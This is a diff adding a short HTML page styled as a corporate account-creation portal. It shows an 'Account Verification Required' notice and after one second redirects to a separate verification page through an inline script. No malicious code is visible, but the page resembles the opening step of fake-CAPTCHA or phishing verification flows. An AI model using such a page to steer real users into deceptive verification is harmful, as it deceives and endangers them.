@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create account: CAPTCHA redirect</title>
+    <style>
+        /* Corporate auth portal theme - Clean blue/white */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #e0f6da;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            color: #189385;
+            margin-bottom: 1rem;
+        }
+        p {
+            color: #666;
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+        }
+        .loading {
+            color: #189385;
+            font-size: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Account Verification Required</h1>
+        <p>Please complete security verification to continue with your account creation.</p>
+        <div class="loading" id="loading">Redirecting...</div>
+    </div>
+    
+    <script src="../js/main.js"></script>
+    <script>
+        // Auto-redirect after brief delay
+        setTimeout(() => {
+            window.location.href = '../verify/home.html';
+        }, 1000);
+    </script>
+</body>
+</html>
+
